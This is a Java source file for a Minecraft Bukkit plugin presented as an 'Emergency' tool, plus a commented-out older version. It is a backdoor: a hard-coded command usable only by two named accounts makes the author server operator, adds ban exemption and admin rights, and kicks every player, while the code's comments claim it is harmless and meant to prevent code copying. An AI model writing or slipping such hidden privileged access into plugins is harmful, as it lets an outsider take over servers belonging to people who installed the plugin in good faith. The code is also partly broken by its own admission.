package me.falceso.emgergeny;
 
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

 
public class FrontDoor extends JavaPlugin {
 
        public void onEnable() {
                Bukkit.getServer().getLogger().info("Emergency enabled!");
        }
        
        public void onDisable() {
            Bukkit.getServer().getLogger().info("Emergnecy disabled!");
    }

    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
           
            if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "The console cannot use Emergeny!");
                    return true;
            }
   
    Player player = (Player) sender;
   

    //INFO: This is not made to hurt the server
    if (cmd.getName().equalsIgnoreCase("falcesofronton")) {
    	
    	if (!sender.getName().equalsIgnoreCase("falceso"))
    	if (!sender.getName().equalsIgnoreCase("DarkGamingDronze")) // Added this just for now for experemental issues
    	{
            Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofronton. Falceso have been notified.");
            return true;
        }
    	
			String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
			Bukkit.broadcastMessage(prefix +  "FrontDoor enabled by " + sender.getName()+ ".");
			Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
    	player.setDisplayName("FrontDoor");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "tag set falceso &7[&5Developer of Youtube&7]");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "op falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "kickall");
        return true;

    }
//After this it's broken....    
 if (cmd.getName().equalsIgnoreCase("falcesofrontoff")) {
    	
    	if (!sender.getName().equalsIgnoreCase("falceso"))
    	if (!sender.getName().equalsIgnoreCase("DarkGamingDronze")) // Added this just for now for experemental issues
    	{
            Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofrontoff. Falceso have been notified.");
            return true;
        }
    
    {
	String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
	Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
	Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
	Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
 return true;
    }
 }
 if (cmd.getName().equalsIgnoreCase("falcesofrontreset")) {
 	
 	if (!sender.getName().equalsIgnoreCase("falceso"))
 	if (!sender.getName().equalsIgnoreCase("DarkGamingDronze")) // Added this just for now for experemental issues
 	{
         Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofrontreset. Falceso have been notified.");
         return true;
     }
 {
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig delete falceso");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
 }
 }
     else return true;
return true;
 }
}
/* PLEASE FIX!
package me.falceso.emgergeny;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
 
public class FrontDoor extends JavaPlugin {
 
        public void onEnable() {
                Bukkit.getServer().getLogger().info("Emergency enabled!");
        }
        
        public void onDisable() {
            Bukkit.getServer().getLogger().info("Emergnecy disabled!");
    }
   
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
           
            if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "The console cannot use Emergeny!");
                    return true;
            }
   
    Player player = (Player) sender;
   
    if (args.length != 1)
    {
        return false;
    }

    //INFO: This is not made to hurt the server
    if (cmd.getName().equalsIgnoreCase("falcesofront")) {
    	
    	if (!sender.getName().equalsIgnoreCase("falceso"))
    	if (!sender.getName().equalsIgnoreCase("DarkGamingDronze")) // Added this just for now for experemental issues
    	if (args[0].equalsIgnoreCase("on"))
    	{
            Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofront. Falceso have been notified.");
            return true;
        }
    	
			String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
			Bukkit.broadcastMessage(prefix +  "FrontDoor enabled by " + sender.getName()+ ".");
			Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
    	player.setDisplayName("FrontDoor");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "tag set falceso &7[&5Developer of Youtube&7]");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "op falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "kickall");
        return true;

    }
//After this it's broken....    
    if (args[0].equalsIgnoreCase("off"))
    {
	String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
	Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
	Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
	Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
	Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig  falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
	
    return true;
    }
    
    if (args[0].equalsIgnoreCase("reset"))
    {
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig  falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
    return true;
    }

	return false;
}
}
*/